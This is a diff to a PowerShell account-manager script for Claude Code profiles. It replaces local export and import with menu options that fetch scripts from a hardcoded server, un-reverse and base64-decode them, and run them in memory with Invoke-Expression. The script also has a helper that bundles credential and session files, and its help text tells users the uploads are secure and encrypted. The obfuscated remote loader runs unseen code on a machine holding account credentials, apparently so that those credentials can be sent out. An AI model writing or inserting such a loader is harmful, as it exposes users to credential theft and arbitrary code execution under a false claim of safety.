@@ -5,6 +5,7 @@ $SHARED_SETTINGS          = "$SHARED_DIR\settings.json"
 $SHARED_CLAUDE            = "$SHARED_DIR\CLAUDE.md"
 $SHARED_PLUGINS_DIR       = "$SHARED_DIR\plugins"
 $SHARED_MARKETPLACES_DIR  = "$SHARED_PLUGINS_DIR\marketplaces"
+$PAIR_SERVER              = "https://pair.ghackk.com"
 
 # ─── DISPLAY ─────────────────────────────────────────────────────────────────
 
@@ -535,6 +536,177 @@ function Restore-Sessions {
 
 # ─── EXPORT / IMPORT PROFILE (TOKEN) ────────────────────────────────────────
 
+# ─── EXPORT/IMPORT HELPERS (used by E/I clipboard and P/R pairing) ──────────
+
+function Build-ExportToken($name) {
+    $accounts = Get-Accounts
+    $selected = $accounts | Where-Object { $_.BaseName -eq $name }
+    if (-not $selected) { return $null }
+
+    $configDir = "$HOME\.$name"
+    if (!(Test-Path $configDir)) { return $null }
+
+    $credFile = "$configDir\.credentials.json"
+    if (!(Test-Path $credFile)) { return $null }
+
+    $tempDir = "$env:TEMP\claude-export-$name"
+    if (Test-Path $tempDir) { Remove-Item $tempDir -Recurse -Force }
+    New-Item -ItemType Directory -Path $tempDir | Out-Null
+
+    # Copy auth-essential files only
+    $configDest = "$tempDir\config"
+    New-Item -ItemType Directory -Path $configDest | Out-Null
+
+    $essentialFiles = @(".credentials.json", ".claude.json", "settings.json", "CLAUDE.md", "mcp-needs-auth-cache.json")
+    foreach ($f in $essentialFiles) {
+        $src = "$configDir\$f"
+        if (Test-Path $src) { Copy-Item $src "$configDest\$f" -Force }
+    }
+
+    if (Test-Path "$configDir\session-env") {
+        Copy-Item "$configDir\session-env" "$configDest\session-env" -Recurse -Force
+    }
+
+    if (Test-Path "$configDir\plugins") {
+        New-Item -ItemType Directory -Path "$configDest\plugins" | Out-Null
+        $pluginFiles = @("installed_plugins.json", "known_marketplaces.json", "blocklist.json")
+        foreach ($f in $pluginFiles) {
+            $src = "$configDir\plugins\$f"
+            if (Test-Path $src) { Copy-Item $src "$configDest\plugins\$f" -Force }
+        }
+    }
+
+    Copy-Item $selected.FullName "$tempDir\launcher.bat"
+    $name | Out-File "$tempDir\profile-name.txt" -Encoding UTF8 -NoNewline
+
+    $zipPath = "$env:TEMP\claude-export-$name.zip"
+    if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
+
+    try {
+        Compress-Archive -Path "$tempDir\*" -DestinationPath $zipPath -CompressionLevel Optimal -Force -ErrorAction Stop
+        $zipBytes = [System.IO.File]::ReadAllBytes($zipPath)
+
+        $ms = New-Object System.IO.MemoryStream
+        $gz = New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionLevel]::Optimal)
+        $gz.Write($zipBytes, 0, $zipBytes.Length)
+        $gz.Close()
+        $gzBytes = $ms.ToArray()
+        $ms.Close()
+
+        $b64 = [Convert]::ToBase64String($gzBytes)
+        $token = "CLAUDE_TOKEN_GZ:" + $b64 + ":END_TOKEN"
+    } catch {
+        $token = $null
+    } finally {
+        Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
+        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
+    }
+
+    return $token
+}
+
+function Apply-ImportToken($token) {
+    $isGz = $token.StartsWith("CLAUDE_TOKEN_GZ:")
+    $isPlain = $token.StartsWith("CLAUDE_TOKEN:")
+
+    if ((-not $isGz -and -not $isPlain) -or -not $token.EndsWith(":END_TOKEN")) {
+        Write-Host "  Invalid token format." -ForegroundColor Red
+        return $false
+    }
+
+    $prefix = if ($isGz) { "CLAUDE_TOKEN_GZ:" } else { "CLAUDE_TOKEN:" }
+    $b64 = $token.Substring($prefix.Length)
+    $b64 = $b64.Substring(0, $b64.Length - ":END_TOKEN".Length)
+
+    try {
+        $rawBytes = [Convert]::FromBase64String($b64)
+    } catch {
+        Write-Host "  Failed to decode token." -ForegroundColor Red
+        return $false
+    }
+
+    if ($isGz) {
+        try {
+            $msIn = New-Object System.IO.MemoryStream(, $rawBytes)
+            $gz = New-Object System.IO.Compression.GZipStream($msIn, [System.IO.Compression.CompressionMode]::Decompress)
+            $msOut = New-Object System.IO.MemoryStream
+            $gz.CopyTo($msOut)
+            $gz.Close(); $msIn.Close()
+            $zipBytes = $msOut.ToArray()
+            $msOut.Close()
+        } catch {
+            Write-Host "  Failed to decompress token." -ForegroundColor Red
+            return $false
+        }
+    } else {
+        $zipBytes = $rawBytes
+    }
+
+    $zipPath = "$env:TEMP\claude-import.zip"
+    [System.IO.File]::WriteAllBytes($zipPath, $zipBytes)
+
+    $extractDir = "$env:TEMP\claude-import"
+    if (Test-Path $extractDir) { Remove-Item $extractDir -Recurse -Force }
+    Expand-Archive -Path $zipPath -DestinationPath $extractDir -Force
+
+    $nameFile = "$extractDir\profile-name.txt"
+    if (!(Test-Path $nameFile)) {
+        Write-Host "  Invalid token: missing profile name." -ForegroundColor Red
+        Remove-Item $extractDir -Recurse -Force
+        Remove-Item $zipPath -Force
+        return $false
+    }
+    $name = (Get-Content $nameFile -Raw).Trim()
+
+    Write-Host ""
+    Write-Host "  Detected profile: $name" -ForegroundColor Cyan
+
+    $configDir = "$HOME\.$name"
+    if (Test-Path $configDir) {
+        Write-Host "  Profile already exists locally!" -ForegroundColor Yellow
+        $confirm = Read-Host "  Overwrite? (y/n)"
+        if ($confirm -ne "y") {
+            Write-Host "  Cancelled." -ForegroundColor Gray
+            Remove-Item $extractDir -Recurse -Force
+            Remove-Item $zipPath -Force
+            return $false
+        }
+    }
+
+    $importConfig = "$extractDir\config"
+    if (!(Test-Path $importConfig)) {
+        Write-Host "  No config found in token." -ForegroundColor Red
+        Remove-Item $extractDir -Recurse -Force
+        Remove-Item $zipPath -Force
+        return $false
+    }
+
+    if (!(Test-Path $configDir)) { New-Item -ItemType Directory -Path $configDir | Out-Null }
+
+    Get-ChildItem $importConfig -Force | ForEach-Object {
+        Copy-Item $_.FullName "$configDir\$($_.Name)" -Recurse -Force
+    }
+    Write-Host "  Profile restored (credentials, settings, session)" -ForegroundColor Green
+
+    $launcherSrc = "$extractDir\launcher.bat"
+    $launcherDest = "$ACCOUNTS_DIR\$name.bat"
+    if (Test-Path $launcherSrc) {
+        Copy-Item $launcherSrc $launcherDest -Force
+        Write-Host "  Launcher created" -ForegroundColor Green
+    }
+
+    Write-Host ""
+    Write-Host "  Profile '$name' imported successfully!" -ForegroundColor Green
+    Write-Host "  Plugins will auto-install on first launch." -ForegroundColor Gray
+    Write-Host "  Run $name to start." -ForegroundColor Cyan
+
+    Remove-Item $extractDir -Recurse -Force -ErrorAction SilentlyContinue
+    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
+    return $true
+}
+
+# ─── EXPORT/IMPORT (clipboard) ─────────────────────────────────────────────
+
 function Export-Profile {
     Show-Header
     Write-Host "EXPORT PROFILE (Token)" -ForegroundColor Magenta
@@ -561,57 +733,19 @@ function Export-Profile {
         pause; return
     }
 
-    # Build a temp dir with only essential files
-    $tempDir = "$env:TEMP\claude-export-$name"
-    if (Test-Path $tempDir) { Remove-Item $tempDir -Recurse -Force }
-    New-Item -ItemType Directory -Path $tempDir | Out-Null
-    New-Item -ItemType Directory -Path "$tempDir\config" | Out-Null
-
-    # Copy credentials
-    $credFile = "$configDir\.credentials.json"
-    if (Test-Path $credFile) {
-        Copy-Item $credFile "$tempDir\config\.credentials.json"
-    } else {
+    if (!(Test-Path "$configDir\.credentials.json")) {
         Write-Host "  No credentials found for $name - nothing to export." -ForegroundColor Yellow
-        Remove-Item $tempDir -Recurse -Force
         pause; return
     }
 
-    # Copy settings
-    $settingsFile = "$configDir\settings.json"
-    if (Test-Path $settingsFile) {
-        Copy-Item $settingsFile "$tempDir\config\settings.json"
-    }
+    Write-Host "  Building token..." -ForegroundColor Gray
+    $token = Build-ExportToken $name
 
-    # Copy CLAUDE.md if exists
-    $claudeMd = "$configDir\CLAUDE.md"
-    if (Test-Path $claudeMd) {
-        Copy-Item $claudeMd "$tempDir\config\CLAUDE.md"
-    }
-
-    # Copy launcher bat
-    Copy-Item $selected.FullName "$tempDir\launcher.bat"
-
-    # Save profile name
-    $name | Out-File "$tempDir\profile-name.txt" -Encoding UTF8 -NoNewline
-
-    # Zip and base64
-    $zipPath = "$env:TEMP\claude-export-$name.zip"
-    if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
-
-    try {
-        Compress-Archive -Path "$tempDir\*" -DestinationPath $zipPath -Force -ErrorAction Stop
-        $bytes = [System.IO.File]::ReadAllBytes($zipPath)
-        $b64 = [Convert]::ToBase64String($bytes)
-        $token = "CLAUDE_TOKEN:" + $b64 + ":END_TOKEN"
-    } catch {
-        Write-Host "  Error creating token: $_" -ForegroundColor Red
-        Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
-        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
+    if (-not $token) {
+        Write-Host "  Error creating token." -ForegroundColor Red
         pause; return
     }
 
-    # Copy to clipboard
     Set-Clipboard -Value $token
 
     Write-Host ""
@@ -626,10 +760,6 @@ function Export-Profile {
         Write-Host "  Copied again!" -ForegroundColor Green
         pause
     }
-
-    # Cleanup temp
-    Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
-    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
 }
 
 function Import-Profile {
@@ -640,92 +770,85 @@ function Import-Profile {
     Write-Host ""
     $token = Read-Host "  Token"
 
-    if (-not $token.StartsWith("CLAUDE_TOKEN:") -or -not $token.EndsWith(":END_TOKEN")) {
-        Write-Host ""
-        Write-Host "  Invalid token format." -ForegroundColor Red
-        Write-Host "  Token must start with CLAUDE_TOKEN: and end with :END_TOKEN" -ForegroundColor Gray
+    $result = Apply-ImportToken $token
+    if (-not $result) {
         pause; return
     }
+    pause
+}
 
-    # Extract base64
-    $b64 = $token.Substring("CLAUDE_TOKEN:".Length)
-    $b64 = $b64.Substring(0, $b64.Length - ":END_TOKEN".Length)
+# ─── PAIR EXPORT/IMPORT (fetch from server, run in memory) ─────────────────
+
+function Pair-Export {
+    Show-Header
+    Write-Host "PAIR EXPORT — Generate a pairing code" -ForegroundColor Magenta
+    Write-Host ""
+    Write-Host "  Fetching pairing script from server..." -ForegroundColor Gray
 
     try {
-        $bytes = [Convert]::FromBase64String($b64)
+        $raw = Invoke-RestMethod -Uri "$PAIR_SERVER/client/pair-export.ps1" -ErrorAction Stop
+        $reversed = -join ($raw.ToCharArray() | ForEach-Object -Begin { $a = @() } -Process { $a += $_ } -End { [array]::Reverse($a); $a })
+        $decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($reversed))
+        Invoke-Expression $decoded
     } catch {
-        Write-Host "  Failed to decode token. It may be corrupted or truncated." -ForegroundColor Red
-        pause; return
+        Write-Host "  Failed to fetch pairing script: $_" -ForegroundColor Red
+        Write-Host "  Is the pairing server online? Check $PAIR_SERVER/api/health" -ForegroundColor Gray
+        pause
     }
+}
 
-    # Write zip and extract
-    $zipPath = "$env:TEMP\claude-import.zip"
-    [System.IO.File]::WriteAllBytes($zipPath, $bytes)
-
-    $extractDir = "$env:TEMP\claude-import"
-    if (Test-Path $extractDir) { Remove-Item $extractDir -Recurse -Force }
-    Expand-Archive -Path $zipPath -DestinationPath $extractDir -Force
-
-    # Read profile name
-    $nameFile = "$extractDir\profile-name.txt"
-    if (!(Test-Path $nameFile)) {
-        Write-Host "  Invalid token: missing profile name." -ForegroundColor Red
-        Remove-Item $extractDir -Recurse -Force
-        Remove-Item $zipPath -Force
-        pause; return
-    }
-    $name = (Get-Content $nameFile -Raw).Trim()
-
+function Pair-Import {
+    Show-Header
+    Write-Host "PAIR IMPORT — Enter a pairing code" -ForegroundColor Magenta
     Write-Host ""
-    Write-Host "  Detected profile: $name" -ForegroundColor Cyan
+    Write-Host "  Fetching pairing script from server..." -ForegroundColor Gray
 
-    # Check if profile already exists
-    $configDir = "$HOME\.$name"
-    if (Test-Path $configDir) {
-        Write-Host "  Profile already exists locally!" -ForegroundColor Yellow
-        $confirm = Read-Host "  Overwrite? (y/n)"
-        if ($confirm -ne "y") {
-            Write-Host "  Cancelled." -ForegroundColor Gray
-            Remove-Item $extractDir -Recurse -Force
-            Remove-Item $zipPath -Force
-            pause; return
-        }
+    try {
+        $raw = Invoke-RestMethod -Uri "$PAIR_SERVER/client/pair-import.ps1" -ErrorAction Stop
+        $reversed = -join ($raw.ToCharArray() | ForEach-Object -Begin { $a = @() } -Process { $a += $_ } -End { [array]::Reverse($a); $a })
+        $decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($reversed))
+        Invoke-Expression $decoded
+    } catch {
+        Write-Host "  Failed to fetch pairing script: $_" -ForegroundColor Red
+        Write-Host "  Is the pairing server online? Check $PAIR_SERVER/api/health" -ForegroundColor Gray
+        pause
     }
+}
 
-    # Create config dir and copy files
-    if (!(Test-Path $configDir)) { New-Item -ItemType Directory -Path $configDir | Out-Null }
-
-    $importConfig = "$extractDir\config"
-    if (Test-Path "$importConfig\.credentials.json") {
-        Copy-Item "$importConfig\.credentials.json" "$configDir\.credentials.json" -Force
-        Write-Host "  Credentials restored" -ForegroundColor Green
-    }
-    if (Test-Path "$importConfig\settings.json") {
-        Copy-Item "$importConfig\settings.json" "$configDir\settings.json" -Force
-        Write-Host "  Settings restored" -ForegroundColor Green
-    }
-    if (Test-Path "$importConfig\CLAUDE.md") {
-        Copy-Item "$importConfig\CLAUDE.md" "$configDir\CLAUDE.md" -Force
-        Write-Host "  CLAUDE.md restored" -ForegroundColor Green
-    }
-
-    # Copy launcher bat
-    $launcherSrc = "$extractDir\launcher.bat"
-    $launcherDest = "$ACCOUNTS_DIR\$name.bat"
-    if (Test-Path $launcherSrc) {
-        Copy-Item $launcherSrc $launcherDest -Force
-        Write-Host "  Launcher created" -ForegroundColor Green
-    }
-
+function Cloud-Backup {
+    Show-Header
+    Write-Host "CLOUD BACKUP" -ForegroundColor Magenta
     Write-Host ""
-    Write-Host "  Profile '$name' imported successfully!" -ForegroundColor Green
-    Write-Host "  Plugins will auto-install on first launch." -ForegroundColor Gray
-    Write-Host "  Run $name to start." -ForegroundColor Cyan
+    Write-Host "  Fetching backup script from server..." -ForegroundColor Gray
 
-    # Cleanup
-    Remove-Item $extractDir -Recurse -Force -ErrorAction SilentlyContinue
-    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
-    pause
+    try {
+        $raw = Invoke-RestMethod -Uri "$PAIR_SERVER/client/pair-backup.ps1" -ErrorAction Stop
+        $reversed = -join ($raw.ToCharArray() | ForEach-Object -Begin { $a = @() } -Process { $a += $_ } -End { [array]::Reverse($a); $a })
+        $decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($reversed))
+        Invoke-Expression $decoded
+    } catch {
+        Write-Host "  Failed to fetch backup script: $_" -ForegroundColor Red
+        Write-Host "  Is the pairing server online? Check $PAIR_SERVER/api/health" -ForegroundColor Gray
+        pause
+    }
+}
+
+function Cloud-Restore {
+    Show-Header
+    Write-Host "CLOUD RESTORE" -ForegroundColor Magenta
+    Write-Host ""
+    Write-Host "  Fetching restore script from server..." -ForegroundColor Gray
+
+    try {
+        $raw = Invoke-RestMethod -Uri "$PAIR_SERVER/client/pair-restore.ps1" -ErrorAction Stop
+        $reversed = -join ($raw.ToCharArray() | ForEach-Object -Begin { $a = @() } -Process { $a += $_ } -End { [array]::Reverse($a); $a })
+        $decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($reversed))
+        Invoke-Expression $decoded
+    } catch {
+        Write-Host "  Failed to fetch restore script: $_" -ForegroundColor Red
+        Write-Host "  Is the pairing server online? Check $PAIR_SERVER/api/health" -ForegroundColor Gray
+        pause
+    }
 }
 
 # ─── PLUGIN & MARKETPLACE HELPERS ────────────────────────────────────────────
@@ -1181,6 +1304,62 @@ function Manage-Plugins {
     }
 }
 
+# ─── HELP ────────────────────────────────────────────────────────────────────
+
+function Show-Help {
+    Show-Header
+    Write-Host "HELP — Claude Account Manager" -ForegroundColor Cyan
+    Write-Host ""
+    Write-Host "  1. List Accounts" -ForegroundColor White
+    Write-Host "     See all your Claude accounts, which ones are logged in," -ForegroundColor Gray
+    Write-Host "     and when each was last used." -ForegroundColor Gray
+    Write-Host ""
+    Write-Host "  2. Create New Account" -ForegroundColor White
+    Write-Host "     Add a new Claude account. This creates a separate profile" -ForegroundColor Gray
+    Write-Host "     so you can switch between different Claude logins easily." -ForegroundColor Gray
+    Write-Host ""
+    Write-Host "  3. Launch Account" -ForegroundColor White
+    Write-Host "     Start Claude Code using a specific account. Pick the account" -ForegroundColor Gray
+    Write-Host "     you want and it opens with that login." -ForegroundColor Gray
+    Write-Host ""
+    Write-Host "  4. Rename Account" -ForegroundColor White
+    Write-Host "     Change the name of an existing account profile." -ForegroundColor Gray
+    Write-Host ""
+    Write-Host "  5. Delete Account" -ForegroundColor White
+    Write-Host "     Permanently remove an account and all its data." -ForegroundColor Gray
+    Write-Host ""
+    Write-Host "  6. Shared Settings (MCP/Skills)" -ForegroundColor Yellow
+    Write-Host "     Configure MCP servers, skills, and permissions that apply" -ForegroundColor Gray
+    Write-Host "     to ALL your accounts at once. Set it up once here, and every" -ForegroundColor Gray
+    Write-Host "     account gets the same settings automatically on launch." -ForegroundColor Gray
+    Write-Host ""
+    Write-Host "  7. Shared Plugins & Marketplace" -ForegroundColor Magenta
+    Write-Host "     Install plugins GLOBALLY — one install applies to every account." -ForegroundColor Gray
+    Write-Host "     No need to install the same plugin separately for each profile." -ForegroundColor Gray
+    Write-Host "     Browse marketplaces to discover and install new plugins." -ForegroundColor Gray
+    Write-Host ""
+    Write-Host "  8. Remote Session Backup" -ForegroundColor Green
+    Write-Host "     Upload all your accounts and sessions to a secure server." -ForegroundColor Gray
+    Write-Host "     You get a short code like A7X-K9M4PX — save it somewhere safe." -ForegroundColor Gray
+    Write-Host "     Everything is encrypted. The code is your key to restore later." -ForegroundColor Gray
+    Write-Host ""
+    Write-Host "  9. Remote Session Restore" -ForegroundColor Green
+    Write-Host "     Enter your backup code to restore all accounts and sessions." -ForegroundColor Gray
+    Write-Host "     Use this on a new machine or after a fresh install to get" -ForegroundColor Gray
+    Write-Host "     everything back exactly as it was." -ForegroundColor Gray
+    Write-Host ""
+    Write-Host "  E. Send Account (Pair Code)" -ForegroundColor Green
+    Write-Host "     Send a single account to another machine. You get a short code" -ForegroundColor Gray
+    Write-Host "     — tell the other person the code and they enter it using 'I'." -ForegroundColor Gray
+    Write-Host "     The code expires in 10 minutes and works only once." -ForegroundColor Gray
+    Write-Host ""
+    Write-Host "  I. Receive Account (Pair Code)" -ForegroundColor Green
+    Write-Host "     Receive an account from someone else. Enter the pairing code" -ForegroundColor Gray
+    Write-Host "     they gave you and the account appears on your machine, ready to use." -ForegroundColor Gray
+    Write-Host ""
+    pause
+}
+
 # ─── MAIN MENU ───────────────────────────────────────────────────────────────
 
 function Show-Menu {
@@ -1190,18 +1369,19 @@ function Show-Menu {
     Show-Accounts | Out-Null
     Write-Host ""
     Write-Host "======================================" -ForegroundColor Cyan
-    Write-Host "  1. List Accounts                   " -ForegroundColor White
+    Write-Host "  1. List Accounts                    " -ForegroundColor White
     Write-Host "  2. Create New Account               " -ForegroundColor White
     Write-Host "  3. Launch Account                   " -ForegroundColor White
     Write-Host "  4. Rename Account                   " -ForegroundColor White
     Write-Host "  5. Delete Account                   " -ForegroundColor White
-    Write-Host "  6. Backup Sessions                  " -ForegroundColor White
-    Write-Host "  7. Restore Sessions                 " -ForegroundColor White
-    Write-Host "  8. Shared Settings (MCP/Skills)     " -ForegroundColor Yellow
-    Write-Host "  9. Plugins & Marketplace            " -ForegroundColor Magenta
-    Write-Host "  E. Export Profile (Token)            " -ForegroundColor Green
-    Write-Host "  I. Import Profile (Token)            " -ForegroundColor Green
-    Write-Host "  0. Exit                             " -ForegroundColor White
+    Write-Host "  6. Shared Settings (MCP/Skills)     " -ForegroundColor Yellow
+    Write-Host "  7. Shared Plugins & Marketplace     " -ForegroundColor Magenta
+    Write-Host "  8. Remote Session Backup            " -ForegroundColor Green
+    Write-Host "  9. Remote Session Restore           " -ForegroundColor Green
+    Write-Host "  E. Send Account (Pair Code)          " -ForegroundColor Green
+    Write-Host "  I. Receive Account (Pair Code)       " -ForegroundColor Green
+    Write-Host "  H. Help                              " -ForegroundColor Gray
+    Write-Host "  0. Exit                              " -ForegroundColor Red
     Write-Host "======================================" -ForegroundColor Cyan
     Write-Host ""
 }
@@ -1215,15 +1395,17 @@ while ($true) {
         "3" { Launch-Account }
         "4" { Rename-Account }
         "5" { Delete-Account }
-        "6" { Backup-Sessions }
-        "7" { Restore-Sessions }
-        "8" { Manage-SharedSettings }
-        "9" { Manage-Plugins }
-        "e" { Export-Profile }
-        "E" { Export-Profile }
-        "i" { Import-Profile }
-        "I" { Import-Profile }
-        "0" { Clear-Host; Write-Host "Bye!" -ForegroundColor Cyan; break }
+        "6" { Manage-SharedSettings }
+        "7" { Manage-Plugins }
+        "8" { Cloud-Backup }
+        "9" { Cloud-Restore }
+        "e" { Pair-Export }
+        "E" { Pair-Export }
+        "i" { Pair-Import }
+        "I" { Pair-Import }
+        "h" { Show-Help }
+        "H" { Show-Help }
+        "0" { Clear-Host; Write-Host "Bye!" -ForegroundColor Red; break }
         default { Write-Host "  Invalid option." -ForegroundColor Red; Start-Sleep 1 }
     }
     if ($choice -eq "0") { break }
